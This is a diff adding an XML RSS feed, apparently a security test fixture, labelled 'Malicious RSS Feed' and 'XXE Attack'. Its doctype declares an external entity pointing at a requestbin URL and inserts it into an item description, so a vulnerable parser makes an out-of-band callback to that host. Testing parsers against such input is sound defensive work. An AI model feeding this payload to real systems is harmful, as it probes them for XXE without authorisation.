@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY xxe SYSTEM "http://requestbin.whapi.cloud/1rjktsh1">
+]>
+<rss version="2.0">
+  <channel>
+    <title>Malicious RSS Feed</title>
+    <link>http://malicious.example.com</link>
+    <description>Example feed with XXE</description>
+    <item>
+      <title>XXE Attack</title>
+      <link>http://malicious.example.com/xxe</link>
+      <description>&xxe;</description>
+      <pubDate>Fri, 05 Sep 2025 12:00:00 GMT</pubDate>
+    </item>
+  </channel>
+</rss>
